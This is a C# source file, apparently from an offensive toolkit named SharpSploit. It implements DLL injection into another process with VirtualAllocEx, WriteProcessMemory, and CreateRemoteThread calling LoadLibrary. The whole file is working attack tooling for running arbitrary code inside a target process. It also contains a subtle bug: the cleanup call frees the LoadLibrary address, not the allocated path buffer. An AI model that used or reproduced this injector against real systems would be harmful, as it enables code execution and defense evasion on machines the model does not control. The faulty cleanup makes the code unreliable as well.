using SharpSploit.Core;
using System;
using System.IO;
using System.Text;

namespace SharpSploit.DLLInjection.Methods
{
    class CreateRemoteThreadMethod : InjectorMethod
    {
        override public IntPtr InjectHandle(IntPtr hProcess, FileInfo dll)
        {
            // allocate memory
            byte[] pathBytes = Encoding.ASCII.GetBytes(dll.FullName + "\0");
            var addressOfDllPath = WinAPI.VirtualAllocEx(
                hProcess,
                IntPtr.Zero,
                (uint)pathBytes.Length,
                WinAPI.AllocationType.Reserve | WinAPI.AllocationType.Commit,
                WinAPI.MemoryProtection.ExecuteReadWrite);
            Logger.CheckError(addressOfDllPath == IntPtr.Zero, "Failed to allocate memory in process");

            // write dll name to process
            bool success = WinAPI.WriteProcessMemory(
                hProcess,
                addressOfDllPath,
                pathBytes,
                pathBytes.Length,
                out IntPtr tmp);
            Logger.CheckError(!success, "Failed to write to process memory");

            // get kernel module handle
            IntPtr kernel32Module = WinAPI.GetModuleHandle(WinAPI.KERNEL32_DLL);
            Logger.CheckError(kernel32Module == IntPtr.Zero, "Cannot get handle to kernel32 module");

            // get load lib addr
            IntPtr loadLibraryAddress = WinAPI.GetProcAddress(kernel32Module, WinAPI.LOAD_LIBRARY_PROC);
            Logger.CheckError(loadLibraryAddress == IntPtr.Zero, "Cannot get address of LoadLibrary function");

            // create thread
            IntPtr hTread = WinAPI.CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLibraryAddress, addressOfDllPath, 0, IntPtr.Zero);
            Logger.CheckError(hTread == IntPtr.Zero, "Cannot create remote thread");

            // wait for thread
            Logger.Info("Waiting for thread...");
            WinAPI.WaitForSingleObject(hTread, WinAPI.INFINITE);

            // free allocated memory
            WinAPI.VirtualFreeEx(hProcess, loadLibraryAddress, (uint)pathBytes.Length, WinAPI.FreeType.Release);

            return hTread;
        }
    }
}
